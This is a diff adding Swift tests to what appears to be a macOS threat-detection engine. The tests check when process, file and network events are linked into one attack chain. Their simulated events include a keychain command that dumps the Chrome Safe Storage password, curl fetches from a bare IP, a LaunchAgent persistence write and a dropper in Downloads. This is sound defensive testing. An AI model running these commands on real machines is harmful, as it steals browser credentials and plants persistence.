@@ -101,4 +101,71 @@ import Testing
         s.feed(net(slack, pid: 1000, to: "3.68.170.153:443", host: "app.slack.com"))
         #expect(s.fired.isEmpty)
     }
+
+    // MARK: Causal links: only related steps share a story
+
+    let fish = "/opt/homebrew/bin/fish"
+    var agent: String { "\(home)/.local/bin/agent" }
+    let dump = "security find-generic-password -s 'Chrome Safe Storage' -w"
+
+    /// iTerm -> login -> fish -> a long-lived CLI agent.
+    func terminalAgent() -> Scenario {
+        let s = Scenario()
+        s.feed(exec(iterm, pid: 600, ppid: 1, parent: "/sbin/launchd"))
+        s.feed(exec("/usr/bin/login", pid: 610, ppid: 600, parent: iterm))
+        s.feed(exec(fish, pid: 620, ppid: 610, parent: "/usr/bin/login"))
+        s.feed(exec(agent, pid: 630, ppid: 620, parent: fish))
+        return s
+    }
+
+    func chained(_ s: Scenario) -> Bool {
+        s.stories.openChains.contains {
+            $0.stages.contains(.network) && ($0.stages.contains(.credential) || $0.stages.contains(.persistence))
+        }
+    }
+
+    @Test func longLivedProcessActionsMinutesApartDoNotChain() {
+        let s = terminalAgent()
+        s.feed(exec("/usr/bin/security", pid: 701, ppid: 630, parent: agent, args: dump))
+        s.feed(exec("/usr/bin/curl", pid: 710, ppid: 630, parent: agent, args: "curl http://45.1.1.1/x"), after: 300)
+        s.feed(net("/usr/bin/curl", pid: 710, to: "45.1.1.1:80"))
+        #expect(!chained(s))
+    }
+
+    @Test func stepsOfOneScriptChain() {
+        let s = terminalAgent()
+        s.feed(exec("/bin/sh", pid: 700, ppid: 630, parent: agent, args: "sh -c x"))
+        s.feed(file("/bin/sh", pid: 700, "w", "\(home)/Library/LaunchAgents/com.agent.plist"))
+        s.feed(exec("/usr/bin/curl", pid: 702, ppid: 700, parent: "/bin/sh", args: "curl http://45.1.1.1/x"), after: 10)
+        s.feed(net("/usr/bin/curl", pid: 702, to: "45.1.1.1:80"))
+        #expect(chained(s))
+    }
+
+    @Test func separateCommandsInAnInteractiveShellDoNotChain() {
+        let s = terminalAgent()
+        s.feed(exec("/usr/bin/security", pid: 700, ppid: 620, parent: fish, args: dump))
+        s.feed(exec("/usr/bin/curl", pid: 710, ppid: 620, parent: fish, args: "curl http://45.1.1.1/x"), after: 20)
+        s.feed(net("/usr/bin/curl", pid: 710, to: "45.1.1.1:80"))
+        #expect(!chained(s))
+    }
+
+    @Test func reusedPidIsNotTheSameProcess() {
+        let s = Scenario()
+        let dropper = "\(home)/Downloads/helper"
+        s.feed(exec(dropper, pid: 900, ppid: 1, parent: "/sbin/launchd"))
+        s.feed(exec("/usr/bin/security", pid: 910, ppid: 900, parent: dropper, args: dump))
+        s.feed(exec("/usr/bin/curl", pid: 910, ppid: 1, parent: "/sbin/launchd", args: "curl http://45.1.1.1/x"), after: 60)
+        s.feed(net("/usr/bin/curl", pid: 910, to: "45.1.1.1:80"))
+        #expect(!chained(s))
+    }
+
+    @Test func childOfTheProcessThatDidSomethingChains() {
+        let s = Scenario()
+        let dropper = "\(home)/Downloads/helper"
+        s.feed(exec(dropper, pid: 900, ppid: 1, parent: "/sbin/launchd"))
+        s.feed(exec("/usr/bin/security", pid: 910, ppid: 900, parent: dropper, args: dump))
+        s.feed(exec("/usr/bin/curl", pid: 920, ppid: 900, parent: dropper, args: "curl http://45.1.1.1/x"), after: 60)
+        s.feed(net("/usr/bin/curl", pid: 920, to: "45.1.1.1:80"))
+        #expect(chained(s))
+    }
 }
